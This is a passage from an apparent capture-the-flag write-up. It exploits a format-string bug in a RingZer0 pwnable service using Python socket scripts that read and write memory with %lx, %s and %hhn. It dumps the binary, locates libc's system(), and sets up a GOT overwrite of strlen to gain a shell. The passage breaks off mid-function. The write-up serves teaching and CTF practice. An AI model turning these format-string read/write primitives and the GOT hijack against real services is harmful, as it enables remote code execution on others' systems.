<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_directly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$lx</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">addr</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">grab_value_indirectly</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$s</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="n">addr</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># ugly workaround, only grab 8 bytes. will fix this later!</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">,</span> <span class="n">address</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">write_byte_value_via</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;pwn01.ringzer0team.com&#39;</span><span class="p">,</span> <span class="mi">13377</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;$hhn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">read_from_address</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">addr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>      <span class="c"># change address</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>    <span class="c"># write byte</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dump1</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">offset</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">dump1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">parameter_636_addr</span> <span class="o">=</span> <span class="n">grab_value_directly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;parameter 5 points to: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">parameter_636_addr</span><span class="p">)</span>
</span><span class='line'><span class="n">value_at_636</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;address pointed to by parameter 5 contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_636</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">value_at_scratch</span> <span class="o">=</span> <span class="n">grab_value_indirectly</span><span class="p">(</span><span class="mi">636</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch contains: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">value_at_scratch</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">format_offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">value_at_636</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffff00</span><span class="p">)</span> <span class="o">-</span> <span class="n">parameter_636_addr</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;scratch is parameter {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">636</span><span class="o">+</span><span class="n">format_offset</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;read from 0x400000: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">read_from_address</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">,</span> <span class="n">format_offset</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/ringzer0ctf/pwnable-linux/5<span class="nv">$ </span>python sploit3.py
</span><span class='line'>parameter <span class="m">5</span> points to:  0x7fff3ca480d8
</span><span class='line'>address pointed to by parameter <span class="m">5</span> contains:  0x7fff3ca49f01
</span><span class='line'>scratch contains:  0x7369
</span><span class='line'>scratch is parameter 1601
</span><span class='line'><span class="nb">read </span>from 0x400000: 0x10102464c457f
</span></code></pre></td></tr></table></div></figure>


<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...snip...
</span><span class='line'>00014a0: ffc7 <span class="m">8580</span> edff ff41 <span class="m">4141</span> 41c7 <span class="m">8584</span> edff  .......AAAA.....
</span><span class='line'>00014b0: <span class="m">0042</span> <span class="m">4242</span> 42c7 <span class="m">8588</span> edff ff43 <span class="m">4343</span> 43c6  .BBBB......CCCC
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>This looks familiar, doesn&rsquo;t it?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">test</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>xxd -c <span class="m">1</span> dump <span class="p">|</span>grep <span class="m">1260</span> -A512 <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span>tr -d <span class="s1">&#39;\n&#39;</span>
</span><span class='line'>b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
</span><span class='line'>65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;b800...&#39;</span> <span class="p">|</span> rasm2 -d -b <span class="m">64</span> -o 0x401260 -
</span><span class='line'>
</span><span class='line'>mov dword <span class="o">[</span>rbp-0x50<span class="o">]</span>, 0x0
</span><span class='line'>mov eax, <span class="o">[</span>rbp-0x20<span class="o">]</span>
</span><span class='line'>cmp eax, <span class="o">[</span>rbp-0x1c<span class="o">]</span>
</span><span class='line'>jnz dword 0x4015d1
</span><span class='line'>// char *response <span class="o">=</span> NULL<span class="p">;</span>
</span><span class='line'>mov qword <span class="o">[</span>rbp-0x58<span class="o">]</span>, 0x0       
</span><span class='line'>// char *cleanBuffer <span class="o">=</span> NULL<span class="p">;</span>
</span><span class='line'>mov qword <span class="o">[</span>rbp-0x60<span class="o">]</span>, 0x0   
</span><span class='line'>// <span class="nv">response</span> <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>malloc<span class="o">(</span>2048<span class="o">)</span><span class="p">;</span>  
</span><span class='line'>mov edi, 0x800                    
</span><span class='line'>call dword 0x400ba0               
</span><span class='line'>mov <span class="o">[</span>rbp-0x58<span class="o">]</span>, rax
</span><span class='line'>// memset<span class="o">(</span>response, 0, 2048<span class="o">)</span><span class="p">;</span>
</span><span class='line'>mov rax, <span class="o">[</span>rbp-0x58<span class="o">]</span>
</span><span class='line'>mov edx, 0x800
</span><span class='line'>mov esi, 0x0
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400b40
</span><span class='line'>// <span class="nv">cleanBuffer</span> <span class="o">=</span> <span class="o">(</span>char*<span class="o">)</span>malloc<span class="o">(</span>strlen<span class="o">(</span>buf<span class="o">))</span><span class="p">;</span>
</span><span class='line'>lea rax, <span class="o">[</span>rbp-0x11f0<span class="o">]</span>
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400b00   
</span><span class='line'>mov rdi, rax
</span><span class='line'>call dword 0x400ba0
</span><span class='line'>mov <span class="o">[</span>rbp-0x60<span class="o">]</span>, rax
</span><span class='line'>lea rax, <span class="o">[</span>rbp-0x11f0<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000b00: ff25 fa0f <span class="m">0000</span> <span class="m">6807</span> <span class="m">0000</span> 00e9 70ff ffff  .%....h.....p...
</span></code></pre></td></tr></table></div></figure>


<p>This disassembles to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>rasm2 -d -b <span class="m">64</span> -o 0x400b00 -
</span><span class='line'>ff25fa0f0000
</span><span class='line'>jmp qword <span class="o">[</span>rip+0xffa<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0000f70: <span class="m">5348</span> 83ec <span class="m">1048</span> 85ff <span class="m">7416</span> 8b05 4ca9 <span class="m">3400</span>  SH...H..t...L.4.
</span><span class='line'>0000f80: 85c0 <span class="m">7526</span> <span class="m">4883</span> c410 5be9 82fb ffff <span class="m">6690</span>  ..u<span class="p">&amp;</span>H...<span class="o">[</span>.....f.
</span></code></pre></td></tr></table></div></figure>


<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>objdump -d -M intel libc-2.13.so <span class="p">|</span>grep system -A10
</span><span class='line'>
</span><span class='line'>000000000003fc70 &lt;__libc_system&gt;:
</span><span class='line'>   3fc70: <span class="m">53</span>                      push   rbx
</span><span class='line'>   3fc71: <span class="m">48</span> <span class="m">83</span> ec <span class="m">10</span>             sub    rsp,0x10
</span><span class='line'>   3fc75: <span class="m">48</span> <span class="m">85</span> ff                <span class="nb">test   </span>rdi,rdi
</span><span class='line'>   3fc78: <span class="m">74</span> <span class="m">16</span>                   je     3fc90 &lt;__libc_system+0x20&gt;
</span><span class='line'>   3fc7a: 8b <span class="m">05</span> 6c b9 <span class="m">34</span> <span class="m">00</span>       mov    eax,DWORD PTR <span class="o">[</span>rip+0x34b96c<span class="o">]</span>        <span class="c"># 38b5ec &lt;argp_program_version_hook+0x1b4&gt;</span>
</span><span class='line'>   3fc80: <span class="m">85</span> c0                   <span class="nb">test   </span>eax,eax
</span><span class='line'>   3fc82: <span class="m">75</span> <span class="m">26</span>                   jne    3fcaa &lt;__libc_system+0x3a&gt;
</span><span class='line'>   3fc84: <span class="m">48</span> <span class="m">83</span> c4 <span class="m">10</span>             add    rsp,0x10
</span><span class='line'>   3fc88: 5b                      pop    rbx
</span><span class='line'>   3fc89: e9 <span class="m">82</span> fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
</span><span class='line'>   3fc8e: <span class="m">66</span> <span class="m">90</span>                   xchg   ax,ax
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">cleanBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'><span class="c1">// disassembly:</span>
</span><span class='line'><span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x11f0</span><span class="p">]</span>
</span><span class='line'><span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
</span><span class='line'><span class="n">call</span> <span class="n">dword</span> <span class="mh">0x400b00</span> <span class="o">&lt;</span> <span class="n">the</span> <span class="n">GOT</span> <span class="n">entry</span> <span class="k">for</span> <span class="n">strlen</span> <span class="n">will</span> <span class="n">be</span> <span class="n">pointing</span> <span class="n">to</span> <span class="n">system</span><span class="o">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">write_on_stack</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># write out all the bytes of what</span>
</span><span class='line'>  <span class="c"># used to write addresses on the stack</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">what</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
</span><span class='line'>      <span class="n">what</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">b</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>          <span class="n">i</span> <span class="o">=</span> <span class="mi">256</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="n">where</span><span class="p">)</span>
</span><span class='line'>      <span class="n">write_byte_value_via</span><span class="p">(</span><span class="mi">636</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
